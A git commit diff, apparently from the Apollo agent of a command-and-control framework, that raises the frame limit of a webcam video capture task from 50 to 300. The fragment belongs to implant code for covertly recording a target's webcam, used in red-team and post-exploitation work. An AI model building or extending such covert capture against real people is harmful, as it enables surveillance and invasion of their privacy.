4d2b0b2907dfbc52d926e2062d43257c6c3357e7
minirichy3 <adriaferob3@gmail.com>
2025-06-13 10:17:13 +0200

    More frames

--- Payload_Type/apollo/apollo/agent_code/Tasks/webcamvideo.cs
+++ Payload_Type/apollo/apollo/agent_code/Tasks/webcamvideo.cs
@@ -50,7 +50,7 @@ namespace Tasks
 
                 videoSource.NewFrame += (sender, eventArgs) =>
                 {
-                    if (frameCount >= 50)
+                    if (frameCount >= 300)
                     {
                         videoSource.SignalToStop();
                         return;
